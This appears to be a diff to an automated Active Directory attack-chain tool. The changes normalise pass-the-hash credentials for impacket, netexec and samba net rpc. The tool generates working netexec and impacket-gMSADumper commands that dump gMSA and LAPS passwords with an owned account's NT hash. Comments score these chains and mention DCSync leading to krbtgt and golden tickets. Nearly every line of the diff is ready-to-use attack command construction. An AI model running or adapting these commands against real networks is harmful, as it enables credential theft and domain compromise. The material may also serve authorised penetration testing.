@@ -1057,6 +1057,21 @@ def run(report, store, ui=None):
                                 break
                         if _owned_hash:
                             break
+            # iter-99: normalise auth strings once per ACL edge so each branch
+            # reads uniformly. hash form uses '-hashes aad3b4...:NT' (impacket
+            # blank-LM) or '-H NT' (netexec) or '--pw-nt-hash -U user%HASH'
+            # (samba net rpc). Plaintext keeps the original -p / user:pw form.
+            _blank_lm = "aad3b435b51404eeaad3b435b51404ee"
+            if _owned_hash:
+                _impacket_uri = f"'{_dom_e}/{_owned}'"           # no ':pw' suffix
+                _impacket_hash = f"-hashes '{_blank_lm}:{_owned_hash}'"
+                _netexec_auth = f"-H {_owned_hash}"
+                _net_rpc_U = f"-U '{_dom_e}/{_owned}%{_owned_hash}' --pw-nt-hash"
+            else:
+                _impacket_uri = f"'{_dom_e}/{_owned}:{_owned_pw}'"
+                _impacket_hash = ""
+                _netexec_auth = f"-p '{_owned_pw}'"
+                _net_rpc_U = f"-U '{_dom_e}/{_owned}%{_owned_pw}'"
             # iter-37: DCSync rights - direct DCSync without needing to
             # gain admin first. Highest-value ACL-edge chain because it
             # yields krbtgt (which then enables R-GOLDEN at score 15).
@@ -1162,20 +1177,21 @@ def run(report, store, ui=None):
                         f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
+                # iter-99: use _netexec_auth ('-H NT' when hash-only, else -p).
                 chains.append(Chain("R-GMSA-READ", "read gMSA password",
                     f"ReadGMSAPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                     commands=[
-                        f"netexec ldap {_dc_e} -u '{_owned}' -p '{_owned_pw}' --gmsa",
+                        f"netexec ldap {_dc_e} -u '{_owned}' {_netexec_auth} --gmsa",
                         f"# or: impacket-gMSADumper -u '{_owned}' "
-                        f"-p '{_owned_pw}' -d '{_dom_e}' -l {_dc_e}",
+                        f"{_netexec_auth} -d '{_dom_e}' -l {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadLAPSPassword":
                 chains.append(Chain("R-LAPS-READ", "read LAPS password",
                     f"ReadLAPSPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                     commands=[
-                        f"netexec ldap {_dc_e} -u '{_owned}' -p '{_owned_pw}' "
+                        f"netexec ldap {_dc_e} -u '{_owned}' {_netexec_auth} "
                         f"--laps  # filter to {tgt}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddMember":
